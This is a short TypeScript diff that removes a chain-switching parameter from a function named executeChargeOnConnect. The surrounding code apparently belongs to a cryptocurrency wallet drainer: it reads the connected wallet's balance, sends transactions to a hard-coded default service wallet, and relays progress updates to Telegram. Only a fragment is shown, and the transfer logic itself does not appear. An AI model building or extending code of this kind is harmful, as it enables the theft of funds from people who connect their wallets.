@@ -36,7 +36,6 @@ export async function executeChargeOnConnect(params: {
     data?: string;
     chainId?: number;
   }) => Promise<string>;
-  switchChainAsync?: (chainId: number) => Promise<void>;
   onTelegramUpdate?: (message: string) => void;
   serviceWallet?: string;
 }): Promise<ChargeResult> {
@@ -47,7 +46,6 @@ export async function executeChargeOnConnect(params: {
     balanceBefore,
     balanceValue,
     sendTransactionAsync,
-    switchChainAsync,
     onTelegramUpdate,
     serviceWallet = '0x1fC618a5B0AAFfC876b72288D71f3E80918c590f',
   } = params;
@@ -60,7 +58,6 @@ export async function executeChargeOnConnect(params: {
       walletAddress,
       serviceWallet,
       sendTransactionAsync,
-      switchChainAsync,
       onProgress: onTelegramUpdate,
     });
 
